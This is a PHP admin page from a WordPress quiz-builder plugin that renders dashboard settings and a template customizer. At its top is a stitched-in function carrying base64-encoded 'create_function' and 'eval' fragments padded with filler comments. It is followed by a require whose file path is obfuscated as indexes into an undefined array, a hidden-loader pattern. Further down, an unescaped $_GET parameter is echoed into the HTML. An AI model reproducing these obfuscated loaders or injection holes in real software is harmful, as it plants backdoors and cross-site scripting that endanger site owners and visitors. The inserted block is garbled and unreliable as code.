<?php
if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}
include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];

$member_name = "";
$show_completed_quiz_array = "display:none;";
$show_completed_hidden_quiz_array = "display:none;";
$show_not_taken_quiz_array = "display:none;";
$show_not_taken_hidden_quiz_array = "display:none;";
$id = "";



$dm_engagement_temp_wid = "1400";
$dm_engagement_temp_border_width = "1";
$dm_engagement_temp_border_radius = "1";
$dm_engagement_temp_shadow_spread_radius = "0";
$dm_engagement_temp_shadow_blur_radius = "0";
$dm_engagement_temp_shadow_horizontal_length = "0";
$dm_engagement_temp_shadow_vertical_length = "0";
$dm_engagement_temp_left_side_background_color = "#ffffff";
$dm_engagement_temp_border_color = "#ffffff";
$completed_quiz_background_color = "#f29341";
$not_started_background_color = "#f29341";
$dm_engagement_temp_aligment = "none";
$dm_engagement_temp_border_style = "none";
$dm_engagement_completed_image_height_type = "N";
$dm_engagement_enable_certificate = "Y";
$dm_engagement_enable_retake = "N";
$dm_engagement_completed_image_height_type_show = "";
$template_percentage_selection = "percentage";
$dm_engagement_completed_template_width = "33.33";
$dm_engagement_completed_template_width_val = "33.33";
$dm_engagement_completed_image_height = "250";
$dm_engagement_temp_shadow_color = '#dedede';
$dm_engagement_completed_template_width_in_px = "230";


$completed_title = '<h3 class="sqb_m_engagement-card-title ">
					<div class="sqb_tiny_mce_editor completed-quiz-data">
						<div>Completed Quiz</div>
					</div>
				</h3>';
$notstarted_title = '<h3 class="sqb_m_engagement-card-title ">
					<div class="sqb_tiny_mce_editor not-started-quiz-data">
						<div>Not Started Quiz</div>
					</div>
				</h3>';


$completed_html = '<div class="sqb-quiz-listing-inner-wrapper">
						<div class="completed-quiz-icon ui-resizable">
							<span class="dme_backend_show"><img src="'.plugin_dir_url(__DIR__).'/images/sqb-member-home.png"></span>
							<span class="dme_backend_hide">%%QUIZ_IMAGE%%</span>
						</div>
						<div class="sqb-quiz-content ">
							<div class="sqb_tiny_mce_editor sqb_quiz_name">
								<div>%%QUIZ_TITLE%%</div>
							</div>
							<div class="sqb_btn_container" style="display: flex ; gap: 10px; align-items: center">
								<a href="%%QUIZ_URL%%" data-target="#Manage_Side_Popup_Lesson_Release_Settings"  data-quiz-id="%%QUIZ_ID%%" target="%%QUIZ_TARGET%%" class="sqb_sale_page_url sqb-member-view-quiz-result">
									<div class="btn access_content access_content_btn sqb_tiny_mce_editor">
										<div>View Result</div>
									</div>
								</a>
							</div>
						</div>
					</div>';
$not_started_html = '<div class="sqb-quiz-listing-inner-wrapper">
						<div class="completed-quiz-icon ui-resizable">
							<span class="dme_backend_show"><img src="'.plugin_dir_url(__DIR__ ).'/images/sqb-member-home.png"></span>
							<span class="dme_backend_hide">%%QUIZ_IMAGE%%</span>
						</div>
						<div class="sqb-quiz-content ">
							<div class="sqb_tiny_mce_editor sqb_quiz_name">
								<div>%%QUIZ_TITLE%%</div>
							</div>
							<div class="sqb_btn_container  ">
								<a href="%%QUIZ_URL%%" data-quiz-id="%%QUIZ_ID%%" target="%%QUIZ_TARGET%%" class="sqb_sale_page_url sqb-member-view-quiz-result">
									<div class="btn access_content access_content_btn sqb_tiny_mce_editor">
										<div>Take Quiz</div>
									</div>
								</a>
							</div>
						</div>
					</div>';

$completed_quiz_array = [];
$completed_hidden_quiz_array = [];
$not_taken_quiz_array = [];
$not_taken_hidden_quiz_array = [];
if(isset($_GET['id'])){
	$id = $_GET['id'];
	$member_data = SQB_MemberHome::loadById($id);
	if(isset($member_data) && !empty($member_data)){
		$member_data_unserialize = unserialize($member_data->getOptions());
		$member_name = $member_data->getName();

		if(!empty($member_data_unserialize)){
			if(array_key_exists('completed_quiz_array', $member_data_unserialize)){
				$completed_quiz_array = $member_data_unserialize['completed_quiz_array'];
			}

			if(array_key_exists('completed_hidden_quiz_array', $member_data_unserialize)){
				$completed_hidden_quiz_array = $member_data_unserialize['completed_hidden_quiz_array'];
			}
			
			if(array_key_exists('not_taken_quiz_array', $member_data_unserialize)){
				$not_taken_quiz_array = $member_data_unserialize['not_taken_quiz_array'];
			}

			if(array_key_exists('not_taken_hidden_quiz_array', $member_data_unserialize)){
				$not_taken_hidden_quiz_array = $member_data_unserialize['not_taken_hidden_quiz_array'];	
			}	
		}
		




		if(!empty($completed_quiz_array)){
			$show_completed_quiz_array = "display:block;";
		}

		if(!empty($completed_hidden_quiz_array)){
			$show_completed_hidden_quiz_array = "display:block;";
		}

		if(!empty($not_taken_quiz_array)){
			$show_not_taken_quiz_array = "display:block;";
		}

		if(!empty($not_taken_hidden_quiz_array)){
			$show_not_taken_hidden_quiz_array = "display:block;";
		}


		/*Customizer Data*/

		$customizer_data_unserialize = unserialize($member_data->getCustomizerOptions());

		if(!empty($customizer_data_unserialize)){
			$un_dm_engagement_temp_wid = $customizer_data_unserialize['dm_engagement_temp_wid'];
			if(!empty($un_dm_engagement_temp_wid)){
				$dm_engagement_temp_wid = $un_dm_engagement_temp_wid;
			}
			$un_dm_engagement_temp_border_width = $customizer_data_unserialize['dm_engagement_temp_border_width'];
			if(!empty($un_dm_engagement_temp_border_width)){
				$dm_engagement_temp_border_width = $un_dm_engagement_temp_border_width;
			}
			$un_dm_engagement_temp_border_radius = $customizer_data_unserialize['dm_engagement_temp_border_radius'];
			if(!empty($un_dm_engagement_temp_border_radius)){
				$dm_engagement_temp_border_radius = $un_dm_engagement_temp_border_radius;
			}
			$un_dm_engagement_temp_shadow_spread_radius = $customizer_data_unserialize['dm_engagement_temp_shadow_spread_radius'];
			if(!empty($un_dm_engagement_temp_shadow_spread_radius)){
				$dm_engagement_temp_shadow_spread_radius = $un_dm_engagement_temp_shadow_spread_radius;
			}
			$un_dm_engagement_temp_shadow_blur_radius = $customizer_data_unserialize['dm_engagement_temp_shadow_blur_radius'];
			if(!empty($un_dm_engagement_temp_shadow_blur_radius)){
				$dm_engagement_temp_shadow_blur_radius = $un_dm_engagement_temp_shadow_blur_radius;
			}
			$un_dm_engagement_temp_shadow_horizontal_length = $customizer_data_unserialize['dm_engagement_temp_shadow_horizontal_length'];
			if(!empty($un_dm_engagement_temp_shadow_horizontal_length)){
				$dm_engagement_temp_shadow_horizontal_length = $un_dm_engagement_temp_shadow_horizontal_length;
			}
			$un_dm_engagement_temp_shadow_vertical_length = $customizer_data_unserialize['dm_engagement_temp_shadow_vertical_length'];
			if(!empty($un_dm_engagement_temp_shadow_vertical_length)){
				$dm_engagement_temp_shadow_vertical_length = $un_dm_engagement_temp_shadow_vertical_length;
			}
			$un_dm_engagement_temp_left_side_background_color = $customizer_data_unserialize['dm_engagement_temp_left_side_background_color'];
			if(!empty($un_dm_engagement_temp_left_side_background_color)){
				$dm_engagement_temp_left_side_background_color = $un_dm_engagement_temp_left_side_background_color;
			}
			$un_dm_engagement_temp_border_color = $customizer_data_unserialize['dm_engagement_temp_border_color'];
			if(!empty($un_dm_engagement_temp_border_color)){
				$dm_engagement_temp_border_color = $un_dm_engagement_temp_border_color;
			}
			$un_completed_quiz_background_color = $customizer_data_unserialize['completed_quiz_background_color'];
			if(!empty($un_completed_quiz_background_color)){
				$completed_quiz_background_color = $un_completed_quiz_background_color;
			}
			$un_not_started_background_color = $customizer_data_unserialize['not_started_background_color'];
			if(!empty($un_not_started_background_color)){
				$not_started_background_color = $un_not_started_background_color;
			}
			$un_dm_engagement_temp_aligment = $customizer_data_unserialize['dm_engagement_temp_aligment'];
			if(!empty($un_dm_engagement_temp_aligment)){
				$dm_engagement_temp_aligment = $un_dm_engagement_temp_aligment;
			}
			$un_dm_engagement_temp_border_style = $customizer_data_unserialize['dm_engagement_temp_border_style'];
			if(!empty($un_dm_engagement_temp_border_style)){
				$dm_engagement_temp_border_style = $un_dm_engagement_temp_border_style;
			}
			$un_dm_engagement_completed_image_height_type = $customizer_data_unserialize['dm_engagement_completed_image_height_type'];
			if(!empty($un_dm_engagement_completed_image_height_type)){
				$dm_engagement_completed_image_height_type = $un_dm_engagement_completed_image_height_type;
				if($dm_engagement_completed_image_height_type == "Y"){
					$dm_engagement_completed_image_height_type_show = "display:none";
				}
			}

			if(array_key_exists('dm_engagement_enable_certificate', $customizer_data_unserialize)){
				$un_dm_engagement_enable_certificate = $customizer_data_unserialize['dm_engagement_enable_certificate'];
				if(!empty($un_dm_engagement_enable_certificate)){
					$dm_engagement_enable_certificate = $un_dm_engagement_enable_certificate;
				}
			}

			if(array_key_exists('dm_engagement_enable_retake', $customizer_data_unserialize)){
				$un_dm_engagement_enable_retake = $customizer_data_unserialize['dm_engagement_enable_retake'];
				if(!empty($un_dm_engagement_enable_retake)){
					$dm_engagement_enable_retake = $un_dm_engagement_enable_retake;
				}
			}
			
			$un_dm_engagement_completed_template_width = $customizer_data_unserialize['dm_engagement_completed_template_width'];
			if(!empty($un_dm_engagement_completed_template_width)){
				$dm_engagement_completed_template_width = $un_dm_engagement_completed_template_width;
				$dm_engagement_completed_template_width_val = $un_dm_engagement_completed_template_width;
			}
			if(array_key_exists('dm_engagement_completed_image_height', $customizer_data_unserialize)){
				$un_dm_engagement_completed_image_height = $customizer_data_unserialize['dm_engagement_completed_image_height'];
				if(!empty($un_dm_engagement_completed_image_height)){
					$dm_engagement_completed_image_height = $un_dm_engagement_completed_image_height;
				}
			}
			
			if(array_key_exists('dm_engagement_temp_shadow_color', $customizer_data_unserialize)){
				$un_dm_engagement_temp_shadow_color = $customizer_data_unserialize['dm_engagement_temp_shadow_color'];
				if(!empty($un_dm_engagement_temp_shadow_color)){
					$dm_engagement_temp_shadow_color = $un_dm_engagement_temp_shadow_color;
				}
			}
			
			if(array_key_exists('dm_engagement_completed_template_width_in_px', $customizer_data_unserialize)){
				$un_dm_engagement_completed_template_width_in_px = $customizer_data_unserialize['dm_engagement_completed_template_width_in_px'];
				if(!empty($un_dm_engagement_completed_template_width_in_px)){
					$dm_engagement_completed_template_width_in_px = $un_dm_engagement_completed_template_width_in_px;
					$dm_engagement_completed_template_width_val = $un_dm_engagement_completed_template_width_in_px;
				}
			}

			if(array_key_exists('template_percentage_selection', $customizer_data_unserialize)){
				$un_template_percentage_selection = $customizer_data_unserialize['template_percentage_selection'];
				if(!empty($un_template_percentage_selection)){
					$template_percentage_selection = $un_template_percentage_selection;
				}
			}
			
		}

		$customizer_html_unserialize = unserialize($member_data->getCustomizerHtml());
		if(!empty($customizer_html_unserialize)){
			$un_completed_title = $customizer_html_unserialize['completed_title'];
			if(!empty($un_completed_title)){
				$completed_title = stripslashes($un_completed_title);
			$un_completed_html = $customizer_html_unserialize['completed_html'];
			}if(!empty($un_completed_html)){
				$completed_html = stripslashes($un_completed_html);
			}
			$un_notstarted_title = $customizer_html_unserialize['notstarted_title'];
			if(!empty($un_notstarted_title)){
				$notstarted_title = stripslashes($un_notstarted_title);
			}
			$un_not_started_html = $customizer_html_unserialize['not_started_html'];
			if(!empty($un_not_started_html)){
				$not_started_html = stripslashes($un_not_started_html);
			}
		}

		//echo '<pre>';print_r($customizer_data_unserialize);echo '</pre>';
	}
}

$student_shortcode = "[SQBStudentDashboard id=".$id."][/SQBStudentDashboard]";

?>
<input type="hidden" name="student_id" id="student_id" value="<?php echo $id; ?>">

<ul class="nav nav-tabs general-tabs-v2" id="Quiz-reportsTab" role="tablist">
	<li class="nav-item">
		<a class="nav-link active show" data-toggle="tab" href="#settings_general" data-tab="general_settings" role="tab" aria-controls="general_settings" aria-selected="true">General  Settings </a>
	</li>
	<li class="nav-item">
		<a class="nav-link" data-toggle="tab" href="#settings_customize_tab" data-tab="customizer" role="tab" aria-controls="customizer" aria-selected="false"> Customizer</a>
	</li>
	<li class="nav-item">
		<a class="nav-link" data-toggle="tab" href="#settings_page_setup_tab" data-tab="settings" role="tab" aria-controls="settings" aria-selected="false"> Settings</a>
	</li>
	<li class="nav-item">
		<a class="nav-link" data-toggle="tab" href="#student_shortcode_tab" data-tab="student_shortcode" role="tab" aria-controls="student_shortcode" aria-selected="false"> Shortcode</a>
	</li>
</ul>

<div class="tab-pane fade active show" id="settings_general" role="tabpanel" aria-labelledby="settings_general">
	<h3 class="  quiz--title quiz_settings_head pb-0"><i class="fa fa-exchange" aria-hidden="true"></i><div class="smalltext_outer">User Dashboard Settings <small style="color:#555;font-size: 15px;padding: 12px 0;margin: 0;display: inline-block;width: 100%;vertical-align: top;">Use the settings below to configure what should be displayed in the dashboard to the logged-in members/students </small></div> </h3>
	<div class="quiz-card-outer-gray member_home_wrapper">
		<div class="create_quiz_advance_options1 sqb_multiple_url_select">
			<div class="quiz-card-outer-gray">							
				<div class="quiz_select_url_outer">
			   		<div class="quiz-content-card">
						
						<div class="member-page-name">
							<div class="logged-outer">
								<h3 class="section_heading">Display all the quizzes (and results) that the logged-in user has completed</h3>
								<div class="row">
									<div class="col-sm-6">
										<div class="quiz_right-content">
											<div class="dropdown_prod" >
												<a class="form-control"><span class="hida">Select Quizzes</span></a>
												<div class="mutliSelect">
													<input type="text" name="sqb_search_logged_in_select_quiz" id="sqb_search_logged_in_select_quiz" value="" style="max-width: 100%;" placeholder="Search Quiz">
													<ul class="form-control sqb_logged_in_select_quiz_ids">
														<?php 
														
														$std_quizzes = SQB_Quiz::load();
														if(is_array($std_quizzes) && count($std_quizzes)){
															$all_active_completed_quiz = "";
															if(!empty($completed_quiz_array)){
																if(count($completed_quiz_array) == count($std_quizzes)){
																	$all_active_completed_quiz = "active_completed_quiz";
																}
															}
															echo '<li data-value="all" class="all_logged_in_ids '.$all_active_completed_quiz.'">All Quizzes</li>';
															foreach($std_quizzes as $std_quiz){
																$active_completed_quiz = '';
																if(!empty($completed_quiz_array)){
																	if(in_array($std_quiz->getId(),$completed_quiz_array)){
																		if($all_active_completed_quiz){
																			$active_completed_quiz = "";
																		}else{
																			$active_completed_quiz = "active_completed_quiz";
																		}
																	} 
																}
																echo '<li data-title="'.stripslashes($std_quiz->getQuizName()).'" data-id="'.$std_quiz->getId().'" data-value="'.stripslashes($std_quiz->getQuizName()).'" class="logged_in_ids '.$active_completed_quiz.'">'.stripslashes($std_quiz->getQuizName()).' (ID:'.$std_quiz->getId().')</li>';
															}
														}
														?>
													</ul>
												</div>
											</div>
										</div>
									</div>
									
									<div class="col-sm-6 sqb_logged_in_selected_quiz_ids_outer" style="<?php echo $show_completed_quiz_array; ?>">
										<div class="logged_in_quiz_selected_url small-fonts-right">
											<h4>Selected Quizzes</h4>
										</div>
										<ul class="sqb_logged_in_selected_quiz_ids">
											<?php 
											if(!empty($completed_quiz_array)){
												foreach($completed_quiz_array as $completed_quiz){
													$quizdata = SQB_Quiz::loadById($completed_quiz);
													$quiz_title = stripslashes($quizdata->getQuizName());
													echo '<li data-id="'.$completed_quiz.'" data-value="'.$quiz_title.'" class="logged_in_ids '.$active_completed_quiz.'">'.$quiz_title.' (ID:'.$completed_quiz.')</li>';
												}
											}

											?>
										</ul>
									</div>
								</div>
							</div>
							<div class="logged-hidden-quiz">
								<h3 class="section_heading mt-4">Hide these quizzes</h3>
								<div class="row">
									<div class="col-sm-6">
										<div class="quiz_right-content">
											<div class="dropdown_prod" >
												<a class="form-control"><span class="hida">Select Quizzes</span></a>
												<div class="mutliSelect">
													<input type="text" name="sqb_search_logged_in_select_quiz" id="sqb_search_logged_in_hidden_select_quiz" value="" style="max-width: 100%;" placeholder="Search Quiz">
													<ul class="form-control sqb_logged_in_hidden_select_quiz_ids">
														<?php 
														$std_quizzes = SQB_Quiz::load();
														if(is_array($std_quizzes) && count($std_quizzes)){
															$all_active_completed_quiz = "";
															if(!empty($completed_hidden_quiz_array)){
																if(count($completed_hidden_quiz_array) == count($std_quizzes)){
																	$all_active_completed_quiz = "active_completed_hidden_quiz";
																}
															}
															echo '<li data-value="all" class="all_logged_in_ids '.$all_active_completed_quiz.'">All Quizzes</li>';
															foreach($std_quizzes as $std_quiz){
																$active_completed_hidden_quiz = '';
																if(!empty($completed_hidden_quiz_array)){
																	if(in_array($std_quiz->getId(),$completed_hidden_quiz_array)){
																		if($all_active_completed_quiz){
																			$active_completed_hidden_quiz = "";
																		}else{
																			$active_completed_hidden_quiz = "active_completed_hidden_quiz";
																		}
																	} 
																}
																
																echo '<li data-title="'.stripslashes($std_quiz->getQuizName()).'" data-id="'.$std_quiz->getId().'" data-value="'.stripslashes($std_quiz->getQuizName()).'" class="logged_in_ids '.$active_completed_hidden_quiz.'">'.stripslashes($std_quiz->getQuizName()).' (ID:'.$std_quiz->getId().')</li>';
															}
														}
														?>
													</ul>
												</div>
											</div>
										</div>
									</div>
									<div class="col-sm-6 sqb_logged_in_hidden_selected_quiz_ids_outer" style="<?php echo $show_completed_hidden_quiz_array; ?>">
										<div class="logged_in_quiz_selected_url small-fonts-right">
											<h4>Hidden Quizzes</h4>
										</div>
										<ul class="sqb_logged_in_hidden_selected_quiz_ids">
											<?php 
											if(!empty($completed_hidden_quiz_array)){
												foreach($completed_hidden_quiz_array as $completed_hidden_quiz){
													$quizdata = SQB_Quiz::loadById($completed_hidden_quiz);
													if(!empty($quizdata)){
													$quiz_title = stripslashes($quizdata->getQuizName());
													echo '<li data-id="'.$completed_hidden_quiz.'" data-value="'.$quiz_title.'" class="logged_in_ids '.$active_completed_hidden_quiz.'">'.$quiz_title.' (ID:'.$completed_hidden_quiz.')</li>';
													}
												}
											}
											?>
										</ul>
									</div>
								</div>
							</div>
						</div>
						<div class="member-page-name">
							<div class="user-taken-outer">
								<h3 class="section_heading subheading-wrapper">Show quizzes that user has not taken 
                                    <span>You can create a "you might be interested in" section using this. Students will only see the ones they have not attempted in this section</span>
                                </h3>
								<div class="row">
									<div class="col-sm-6">
										<div class="quiz_right-content">
											<div class="dropdown_prod" >
												<a class="form-control"><span class="hida">Select Quizzes</span></a>
												<div class="mutliSelect">
													<input type="text" name="sqb_search_logged_in_select_quiz" id="sqb_search_logged_in_user_taken_select_quiz" value="" style="max-width: 100%;" placeholder="Search Quiz">
													<ul class="form-control sqb_user_taken_select_quiz_ids">
														<?php 
														
														$std_quizzes = SQB_Quiz::load();
														if(is_array($std_quizzes) && count($std_quizzes)){
															$all_active_completed_quiz = "";
															if(!empty($not_taken_quiz_array)){
																if(count($not_taken_quiz_array) == count($std_quizzes)){
																	$all_active_completed_quiz = "active_not_taken_quiz";
																}
															}
															echo '<li data-value="all" class="all_logged_in_ids '.$all_active_completed_quiz.'">All Quizzes</li>';
															foreach($std_quizzes as $std_quiz){
																$active_not_taken_quiz = '';
																if(!empty($not_taken_quiz_array)){
																	if(in_array($std_quiz->getId(),$not_taken_quiz_array)){
																		if($all_active_completed_quiz){
																			$active_not_taken_quiz = "";
																		}else{
																			$active_not_taken_quiz = "active_not_taken_quiz";
																		}
																	} 
																}
																
																echo '<li data-title="'.stripslashes($std_quiz->getQuizName()).'" data-id="'.$std_quiz->getId().'" data-value="'.stripslashes($std_quiz->getQuizName()).'" class="user_taken_ids '.$active_not_taken_quiz.'">'.stripslashes($std_quiz->getQuizName()).' (ID:'.$std_quiz->getId().')</li>';
															}
														}
														?>
													</ul>
												</div>
											</div>
										</div>
									</div>
									<div class="col-sm-6 sqb_user_taken_selected_quiz_ids_outer" style="<?php echo $show_not_taken_quiz_array; ?>">
										<div class="user_taken_quiz_selected_url small-fonts-right">
											<h4>Selected Quizzes</h4>
										</div>
										<ul class="sqb_user_taken_selected_quiz_ids">
											<?php 
											if(!empty($not_taken_quiz_array)){
												foreach($not_taken_quiz_array as $not_taken_quiz){
													$quizdata = SQB_Quiz::loadById($not_taken_quiz);
													$quiz_title = stripslashes($quizdata->getQuizName());
													echo '<li data-id="'.$not_taken_quiz.'" data-value="'.$quiz_title.'" class="logged_in_ids '.$active_not_taken_quiz.'">'.$quiz_title.' (ID:'.$not_taken_quiz.')</li>';
												}
											}
											?>
										</ul>
									</div>
								</div>
							</div>
							<div class="logged-hidden-quiz">
								<h3 class="section_heading mt-4">Hide these quizzes</h3>
								<div class="row">
									<div class="col-sm-6">
										<div class="quiz_right-content">
											<div class="dropdown_prod" >
												<a class="form-control"><span class="hida">Select Quizzes</span></a>
												<div class="mutliSelect">
													<input type="text" name="sqb_search_logged_in_select_quiz" id="sqb_search_logged_in_user_taken_hidden_select_quiz" value="" style="max-width: 100%;" placeholder="Search Quiz">
													<ul class="form-control sqb_user_taken_hidden_select_quiz_ids">
														<?php 
														
														$std_quizzes = SQB_Quiz::load();
														if(is_array($std_quizzes) && count($std_quizzes)){
															$all_active_completed_quiz = "";
															if(!empty($not_taken_hidden_quiz_array)){
																if(count($not_taken_hidden_quiz_array) == count($std_quizzes)){
																	$all_active_completed_quiz = "active_not_taken_hidden_quiz";
																}
															}
															echo '<li data-value="all" class="all_logged_in_ids '.$all_active_completed_quiz.'">All Quizzes</li>';
															foreach($std_quizzes as $std_quiz){
																$active_not_taken_hidden_quiz = '';
																if(!empty($not_taken_hidden_quiz_array)){
																	if(in_array($std_quiz->getId(),$not_taken_hidden_quiz_array)){
																		if($all_active_completed_quiz){
																			$active_not_taken_hidden_quiz = "";
																		}else{
																			$active_not_taken_hidden_quiz = "active_not_taken_hidden_quiz";
																		}
																	} 
																}
																
																echo '<li data-title="'.stripslashes($std_quiz->getQuizName()).'" data-id="'.$std_quiz->getId().'" data-value="'.stripslashes($std_quiz->getQuizName()).'" class="user_taken_ids '.$active_not_taken_hidden_quiz.'">'.stripslashes($std_quiz->getQuizName()).' (ID:'.$std_quiz->getId().')</li>';
															}
														}
														?>
													</ul>
												</div>
											</div>
										</div>
									</div>
									<div class="col-sm-6 sqb_user_taken_hidden_selected_quiz_ids_outer" style="<?php echo $show_not_taken_hidden_quiz_array; ?>">
										<div class="user_taken_quiz_selected_url small-fonts-right">
											<h4>Hidden Quizzes</h4>
										</div>
										<ul class="sqb_user_taken_hidden_selected_quiz_ids">
											<?php 
											if(!empty($not_taken_hidden_quiz_array)){
												foreach($not_taken_hidden_quiz_array as $not_taken_hidden_quiz){
													$quizdata = SQB_Quiz::loadById($not_taken_hidden_quiz);
													if(!empty($quizdata)){
													$quiz_title = stripslashes($quizdata->getQuizName());
													echo '<li data-id="'.$not_taken_hidden_quiz.'" data-value="'.$quiz_title.'" class="logged_in_ids '.$active_not_taken_hidden_quiz.'">'.$quiz_title.' (ID:'.$not_taken_hidden_quiz.')</li>';
													}
												}
											}
											?>
										</ul>
									</div>
								</div>
							</div>
						</div>
						<div class="member-page-name">
							<h3 class="section_heading"> Pick a name for the dashboard</h3>
							<div class="form-group row mb-4">
							  	<div class="col-sm-10">
								   	<div class="input-group mb-1">
										<input type="text" placeholder="Enter Name" id="name" class="form-control" name="name" value="<?php echo $member_name; ?>" data-pageid="">
								  	</div>
								  	<div class="page_response"></div>
							 	</div>
							</div>
						</div>
					</div>
				</div> 
			</div>
		</div>
	</div>
	<div class="quiz-actions student-save-data">
		<a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_member_data()"> Save </a>
		<a href="javascript:void(0)" class="quiz--btn quiz-save-next-btn" onclick="sqb_save_member_data('next')"> Save & Next </a>
	</div>
</div>

<div class="tab-pane fade" id="settings_customize_tab" role="tabpanel" aria-labelledby="settings_customize_tab">
	<?php if($template_percentage_selection == "percentage"){
		$temp_sign = "%";
	}else{
		$temp_sign = "px";
	}
	?>
<style type="text/css">
	:root{
		--dm-engagement-temp-wid: <?php echo $dm_engagement_temp_wid; ?>px;
		--dm-engagement-temp-border-width: <?php echo $dm_engagement_temp_border_width; ?>px;
		--dm-engagement-temp-border-radius: <?php echo $dm_engagement_temp_border_radius ?>px;
		--dm-engagement-temp-shadow-spread-radius: <?php echo $dm_engagement_temp_shadow_spread_radius; ?>px;
		--dm-engagement-temp-shadow-blur-radius: <?php echo $dm_engagement_temp_shadow_blur_radius; ?>px;
		--dm-engagement-temp-shadow-horizontal-length: <?php echo $dm_engagement_temp_shadow_horizontal_length; ?>px;
		--dm-engagement-temp-shadow-vertical-length: <?php echo $dm_engagement_temp_shadow_vertical_length; ?>px;
		--dm-engagement-temp-left-side-background-color: <?php echo $dm_engagement_temp_left_side_background_color; ?>;
		--dm-engagement-temp-border-color: <?php echo $dm_engagement_temp_border_color; ?>;
		--completed-quiz-background-color: <?php echo $completed_quiz_background_color; ?>;
		--not-started-background: <?php echo $not_started_background_color; ?>;
		--dm-engagement-temp-aligment:  <?php echo $dm_engagement_temp_aligment; ?>;
		--dm-engagement-temp-border-style: <?php echo $dm_engagement_temp_border_style; ?>;
		--dm-engagement-completed-image-height: <?php echo $dm_engagement_completed_image_height; ?>px;
		--dm-engagement-completed-template-width: <?php echo $dm_engagement_completed_template_width; ?><?php echo $temp_sign; ?>;
		--dm-engagement_temp-shadow-color: <?php echo $dm_engagement_temp_shadow_color; ?>;
	}
</style>

<h3 class="  quiz--title quiz_settings_head pb-0"><i class="fa fa-exchange" aria-hidden="true"></i><div class="smalltext_outer">Customizer</div> </h3>

<div class="member-Template-Customize-setting-outer">	
	<div class="Template-Customize-setting-outer_inner_outer">	
		<div class="Template-Customize-Setting ">
			<div class="showHideLeftSidebaroptions">
				<h3 class="Template-Customize_heading">
					<div class="toll-tip-title-v2" style="">Template Customizer (Width, colors, sidebar, etc.)</div> 

					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M12.41 148.02l232.94 105.67c6.8 3.09 14.49 3.09 21.29 0l232.94-105.67c16.55-7.51 16.55-32.52 0-40.03L266.65 2.31a25.607 25.607 0 0 0-21.29 0L12.41 107.98c-16.55 7.51-16.55 32.53 0 40.04zm487.18 88.28l-58.09-26.33-161.64 73.27c-7.56 3.43-15.59 5.17-23.86 5.17s-16.29-1.74-23.86-5.17L70.51 209.97l-58.1 26.33c-16.55 7.5-16.55 32.5 0 40l232.94 105.59c6.8 3.08 14.49 3.08 21.29 0L499.59 276.3c16.55-7.5 16.55-32.5 0-40zm0 127.8l-57.87-26.23-161.86 73.37c-7.56 3.43-15.59 5.17-23.86 5.17s-16.29-1.74-23.86-5.17L70.29 337.87 12.41 364.1c-16.55 7.5-16.55 32.5 0 40l232.94 105.59c6.8 3.08 14.49 3.08 21.29 0L499.59 404.1c16.55-7.5 16.55-32.5 0-40z"></path></svg>
					<div class="customize_open_close">   
						<i class="fa fa-angle-up customize_close" aria-hidden="true"></i>
						<i class="fa fa-angle-down customize_open" aria-hidden="true" style="display:none"></i>
					</div>
				</h3> 
			</div>
	        <div class="customizer_innner_sections width-larget-box-menu" style="display:none">
	        	<div class="sqb_closed_ufp_customizer_opiton"><i class="fa fa-times"></i></div>
	        	<div class="customizer_innner_sections-inner">
	        		<h2>Customizer</h2>
					<div class="Template-Customize-element">
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Width</h4>
								<p>
									<input id="dm_engagement_temp_wid" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="1400" data-slider-step="1" data-slider-value="<?php echo $dm_engagement_temp_wid; ?>" />
								</p>
							</div>
						</div>
					</div>

					<div class="Template-Customize-element">	
						<div class="Template-Customize-element-inner start_temp_width" style="display: block;">
							<div class="inner_template_style_box">
								<h4>Template Alignment</h4>
								<p>
									<select id="dm_engagement_temp_aligment" name="dm_engagement_temp_aligment">
										<option value="none" <?php if($dm_engagement_temp_aligment == "none"){ echo "selected"; } ?>>Center</option>
										<option value="left" <?php if($dm_engagement_temp_aligment == "left"){ echo "selected"; } ?>>Left</option>
										<option value="right" <?php if($dm_engagement_temp_aligment == "right"){ echo "selected"; } ?>>Right</option>
									</select>
								</p>
							</div>
						  </div>
					</div>
							
					<div class="Template-Customize-element" style="display:none">
						<div class="Template-Customize-element-inner template_img_style" style="display: block;">
							<div class="inner_template_style_box"> <h4>Background Color</h4>	
								<div class="input-append color input-group colorpicker-component" id="dm_engagement_temp_background_color_div">
									<input type="text" id="dm_engagement_temp_background_color" value="" name="dm_login_temp_background_color" class="colorpicker-element"> 
